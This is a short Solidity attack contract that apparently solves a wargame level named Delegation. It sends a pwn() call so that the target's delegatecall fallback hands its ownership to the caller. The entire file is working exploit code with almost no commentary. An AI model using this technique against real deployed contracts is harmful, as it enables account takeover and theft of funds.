pragma solidity ^0.8.0;

import './Delegation.sol';
contract Attack{
    Delegation D;
    function exploit(address _addr)public {
        D = Delegation(_addr);
    }
    function attackByDelegation()public {
        //initial state , this code is good. 
        (bool success,) = address(D).call(abi.encode(keccak256("pwn()")));
        //.delegatecall(abi.encodeWithSignature("add(uint256,uint256)", a, b));
        require(success);
    }
}